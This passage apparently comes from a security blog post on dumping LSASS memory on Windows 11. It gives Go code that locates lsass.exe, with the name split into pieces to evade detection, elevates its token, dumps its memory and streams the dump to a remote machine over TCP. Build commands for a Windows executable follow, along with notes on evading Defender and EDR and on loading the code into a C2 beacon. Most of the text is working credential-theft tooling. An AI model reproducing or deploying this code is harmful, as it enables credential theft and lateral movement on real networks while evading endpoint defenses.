	// Connect to remote address
	conn, err := net.Dial("tcp", remoteAddr)
	if err != nil {
		fmt.Printf("Failed to connect to remote machine: %v\n", err)
		return
	}
	defer conn.Close()

	fmt.Println("Connected to remote machine")

	// Copy dump data to remote connection
	_, err = io.Copy(conn, r)
	if err != nil {
		fmt.Printf("Failed to send dump data to remote machine: %v\n", err)
		return
	}

	fmt.Println("Dump data sent successfully to", remoteAddr)
}

func main() {
	processPid := getProcessPid()
	fmt.Printf("Process PID: %d\n", processPid)

	err := elevateProcessToken()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	pd(processPid)
}

// Retrieve the PID of the lsass.exe process
func getProcessPid() int {
	// Create a snapshot of all processes
	snapshot, _, _ := procCreateToolhelp32W.Call(uintptr(TH32CS_SNAPPROCESS), 0)
	if snapshot == 0 {
		log.Fatal("Failed to create process snapshot")
	}
	defer syscall.CloseHandle(syscall.Handle(snapshot))

	var pe32 PROCESSENTRY32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	// Retrieve information about the first process encountered in the snapshot
	ret, _, _ := procProcess32First.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
	if ret == 0 {
		log.Fatal("Failed to get process entry")
	}

	// Target process name
	name := "l" + "s" + "a" + "s" + "s" + "." + "e" + "x" + "e"

	// Iterate through the process list to find the target process
	for {
		processName := syscall.UTF16ToString(pe32.szExeFile[:])
		if processName == name {
			fmt.Printf("Found process with PID: %d\n", pe32.th32ProcessID)
			return int(pe32.th32ProcessID)
		}
		ret, _, _ := procProcess32Next.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
		if ret == 0 {
			break
		}
	}

	log.Fatal("process not found")
	return 0
}

```

```bash

# Setup Golang Environment 
go env -w GO111MODULE=auto

# From within source directory 
go mod init main
go mod tidy

# Compile Go code into Windows PE
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -o test.exe remote_dump.go
```
![](/assets/posts/2024-05-19-LSASS-Dumping-Windows11/remote_lsass.bmp)

![](/assets/posts/2024-05-19-LSASS-Dumping-Windows11/lsass_dump_transferred.bmp)



The screenshots above demonstrate our successful LSASS dump, transferring the content directly to a remote machine via an anonymous pipe. This confirms my suspicion that Defender doesn't flag LSASS dumping itself but instead detects when LSASS content is dropped to disk without encryption.

This technique could be implemented with greater caution toward EDR detection. Moreover, if converted into a .NET assembly, it could be integrated into a C2 framework's inject-assembly functionality to execute it within the existing beacon's process. Subsequently, the contents could be transferred over the same open connection that the C2 has.

I intend to cover the final part of this blog soon, but I wanted to document this work first.